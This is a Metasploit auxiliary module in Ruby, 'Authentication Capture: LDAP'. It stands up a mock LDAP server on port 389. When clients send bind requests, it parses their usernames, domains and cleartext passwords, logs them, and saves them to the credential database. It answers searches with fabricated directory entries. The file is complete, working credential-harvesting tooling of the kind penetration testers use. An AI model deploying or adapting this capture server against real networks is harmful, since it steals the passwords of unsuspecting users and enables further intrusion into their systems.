##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'net/ldap'
require 'net/ldap/dn'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::LDAP::Server

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Authentication Capture: LDAP',
        'Description' => %q{
          This module mocks an LDAP service to capture authentication
          information of a client trying to authenticate against an LDAP service
        },
        'Author' => 'JustAnda7',
        'License' => MSF_LICENSE,
        'Action' => [
          [ 'Capture', { 'Description' => 'Run an LDAP capture server' } ]
        ],
        'PassiveActions' => [ 'Capture' ],
        'DefaultActions' => 'Capture',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptAddress.new('SRVHOST', [ true, 'The localhost to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ])
      ]
    )

    deregister_options('LDIF_FILE')

    register_advanced_options(
      [
        OptPath.new('LDIF_FILE', [ false, 'Directory LDIF file path'])
      ]
    )
  end

  def run
    exploit
  end

  def on_dispatch_request(client, data)
    return if data.strip.empty? || data.strip.nil?

    state = {}

    state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport
    }

    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") unless data.empty?

      res = case pdu.app_tag
            when Net::LDAP::PDU::BindRequest
              domains = []
              names = []
              result_code = nil
              user_login = pdu.bind_parameters

              if user_login.name.empty? && user_login.authentication.empty?
                state[client][:user] = user_login.name
                state[client][:pass] = user_login.authentication
                state[client][:domain] = nil
                result_code = Net::LDAP::ResultCodeSuccess
              elsif !user_login.name.empty?
                if user_login.name =~ /@/
                  pub_info = user_login.name.split('@')
                  if pub_info.length <= 2
                    state[client][:user] = pub_info[0]
                    state[client][:domain] = pub_info[1]
                  else
                    result_code = Net::LDAP::ResultCodeInvalidCredentials
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                  end
                elsif user_login.name =~ /,/
                  begin
                    dn = Net::LDAP::DN.new(user_login.name)
                    dn.each_pair do |key, value|
                      if key == 'cn'
                        names << value
                      elsif key == 'dc'
                        domains << value
                      end
                    end
                    state[client][:user] = names.first
                    state[client][:domain] = domains.empty? ? nil : domains.join('.')
                  rescue InvalidDNError => e
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                    raise e
                  end
                elsif user_login.name =~ /\\/
                  pub_info = user_login.name.split('\\')
                  if pub_info.length <= 2
                    state[client][:user] = pub_info[1]
                    state[client][:domain] = pub_info[0]
                  else
                    result_code = Net::LDAP::ResultCodeInvalidCredentials
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                  end
                else
                  state[client][:user] = user_login.name
                  state[client][:domain] = nil
                  result_code = Net::LDAP::ResultCodeInvalidCredentials
                end
              else
                state[client][:user] = ''
                state[client][:domain] = nil
              end

              state[client][:pass] = user_login.authentication

              unless state[client][:user].empty? && state[client][:pass].empty?
                report_cred(
                  ip: state[client][:ip],
                  port: client.localport,
                  service_name: 'ldap',
                  user: state[client][:user],
                  password: state[client][:pass],
                  domain: state[client][:domain]
                )
              end
              result_message = "LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:pass]}"
              result_message += " Domain:#{state[client][:domain]}" if state[client][:domain]
              print_good(result_message)
              result_code = Net::LDAP::ResultCodeAuthMethodNotSupported if result_code.nil?
              service.encode_ldap_response(
                pdu.message_id,
                result_code,
                '',
                Net::LDAP::ResultStrings[result_code],
                Net::LDAP::PDU::BindResult
              )
            when Net::LDAP::PDU::SearchRequest
              filter = Net::LDAP::Filter.parse_ldap_filter(pdu.search_parameters[:filter])
              attrs = pdu.search_parameters[:attributes].empty? ? :all : pdu.search_parameters[:attributes]
              res = search_res(filter, pdu.message_id, attrs)
              if res.nil? || res.empty?
                result_code = Net::LDAP::ResultCodeNoSuchObject
              else
                client.write(res)
                result_code = Net::LDAP::ResultCodeSuccess
              end
              service.encode_ldap_response(
                pdu.message_id,
                result_code,
                '',
                Net::LDAP::ResultStrings[result_code],
                Net::LDAP::PDU::SearchResult
              )
            when Net::LDAP::PDU::UnbindRequest
              client.close
              nil
            else
              if suitable_response(pdu.app_tag)
                result_code = Net::LDAP::ResultCodeUnwillingToPerform
                service.encode_ldap_response(
                  pdu.message_id,
                  result_code,
                  '',
                  Net::LDAP::ResultStrings[result_code],
                  suitable_response(pdu.app_tag)
                )
              else
                client.close
              end
            end

      on_send_response(client, res) unless res.nil?
    rescue StandardError => e
      client.close
      print_error("Failed to handle LDAP request due to #{e}")
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    if opts[:domain]
      credential_data = {
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: opts[:domain]
      }.merge(credential_data)
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def search_res(filter, msgid, attrflt = :all)
    if @ldif.nil? || @ldif.empty?
      attrs = []
      if attrflt.is_a?(Array)
        attrflt.each do |at|
          attrval = [Rex::Text.rand_text_alphanumeric(10)].map(&:to_ber).to_ber_set
          attrs << [at.to_ber, attrval].to_ber_sequence
        end
        dn = "dc=#{Rex::Text.rand_text_alphanumeric(10)},dc=#{Rex::Text.rand_text_alpha(4)}"
        appseq = [
          dn.to_ber,
          attrs.to_ber_sequence
        ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
        [msgid.to_ber, appseq].to_ber_sequence
      end
    else
      ldif.map do |bind_dn, entry|
        next unless filter.match(entry)

        attrs = []
        entry.each do |k, v|
          if attrflt == :all || attrflt.include?(k.downcase)
            attrvals = v.map(&:to_ber).to_ber_set
            attrs << [k.to_ber, attrvals].to_ber_sequence
          end
        end
        appseq = [
          bind_dn.to_ber,
          attrs.to_ber_sequence
        ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
        [msgid.to_ber, appseq].to_ber_sequence
      end.compact.join
    end
  end

  def suitable_response(request)
    responses = {
      Net::LDAP::PDU::BindRequest => Net::LDAP::PDU::BindResult,
      Net::LDAP::PDU::SearchRequest => Net::LDAP::PDU::SearchResult,
      Net::LDAP::PDU::ModifyRequest => Net::LDAP::PDU::ModifyResponse,
      Net::LDAP::PDU::AddRequest => Net::LDAP::PDU::AddResponse,
      Net::LDAP::PDU::DeleteRequest => Net::LDAP::PDU::DeleteResponse,
      Net::LDAP::PDU::ModifyRDNRequest => Net::LDAP::PDU::ModifyRDNResponse,
      Net::LDAP::PDU::CompareRequest => Net::LDAP::PDU::CompareResponse,
      Net::LDAP::PDU::ExtendedRequest => Net::LDAP::PDU::ExtendedResponse
    }

    responses[request]
  end
end
